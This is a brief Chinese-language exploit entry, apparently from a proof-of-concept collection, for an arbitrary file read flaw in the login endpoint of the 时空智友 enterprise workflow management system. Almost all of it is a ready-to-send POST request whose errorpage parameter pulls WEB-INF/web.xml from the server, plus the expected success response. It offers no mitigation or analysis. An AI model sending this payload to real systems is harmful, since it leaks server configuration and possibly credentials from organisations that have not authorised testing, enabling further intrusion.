# 时空智友企业流程化管控系统login任意文件读取漏洞

- **系统**：时空智友企业流程化管控系统login　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **请求**：`POST /login HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=2FA8E20E8AD7DA8D9E894C85B1305755; __qypid=""`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
op=verify%7Clogin&targetpage=&errorpage=WEB-INF/web.xml&mark=&tzo=480&username=admin&password=admin
```
- **预期**：200　|　welcome